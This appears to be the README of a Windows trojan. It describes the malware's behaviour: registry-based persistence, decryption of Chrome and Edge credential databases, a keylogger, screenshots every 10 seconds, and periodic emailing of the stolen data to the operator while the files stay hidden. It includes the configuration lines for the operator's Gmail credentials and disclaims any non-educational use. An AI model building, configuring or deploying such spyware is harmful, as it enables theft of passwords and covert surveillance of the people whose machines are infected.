# Trojan

### Disclaimer:

#### Any use of the Software not for training purposes entails criminal liability. The author used the code for educational purposes

### How it Work (only on Windows):

1. The program is written to Windows startup via the registry
2. The decrypted Google database is written to a file
3. The decrypted Microsoft Edge database is written to a file
4. The keylogger starts working
5. The files from the database are sent to the mail
6. Once every 5 minutes, the keylogger file is sent to the mail
7. Screenshots every 10 seconds and sending this folder to the mail every 2 minutes
8. When the number of screenshots reaches 12, the folder with them is cleared
9. All files and folders are hidden, except for the program itself

#### The program runs in multiple threads, so all processes occur simultaneously

#### Replace it with your information (d'your_gmail' and 'password_appa') in **send_file** function. (If you want test this program)
 
```
msg['From'] = 'your_gmail'
msg['To'] = 'your_gmail'
server.login('your_gmail', 'password_app')
``` 
